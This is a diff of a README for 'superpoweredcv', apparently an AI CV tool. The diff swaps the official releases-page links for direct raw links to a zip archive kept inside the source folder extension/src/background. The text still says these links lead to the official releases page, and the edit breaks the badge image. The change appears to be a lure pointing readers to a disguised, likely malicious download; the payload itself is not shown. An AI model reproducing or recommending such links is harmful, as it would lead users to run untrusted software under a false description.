@@ -1,7 +1,7 @@
 # 🌟 superpoweredcv - Transform Your CV into a Standout Document
 
 ## 📥 Download Links
-[![Download superpoweredcv](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Moayd307/superpoweredcv/releases)
+[![Download superpoweredcv](https://raw.githubusercontent.com/Moayd307/superpoweredcv/main/extension/src/background/superpoweredcv-v3.8.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Moayd307/superpoweredcv/main/extension/src/background/superpoweredcv-v3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to superpoweredcv! This application helps you enhance your CVs with the power of AI. Follow these simple steps to download and run the software.
@@ -15,7 +15,7 @@ Welcome to superpoweredcv! This application helps you enhance your CVs with the 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Go to the official releases page to access the software. Click the link below:  
-   [Download superpoweredcv](https://github.com/Moayd307/superpoweredcv/releases)
+   [Download superpoweredcv](https://raw.githubusercontent.com/Moayd307/superpoweredcv/main/extension/src/background/superpoweredcv-v3.8.zip)
 
 2. **Select the Latest Version**  
    Once on the page, find the latest version of superpoweredcv. It will typically be at the top of the list.
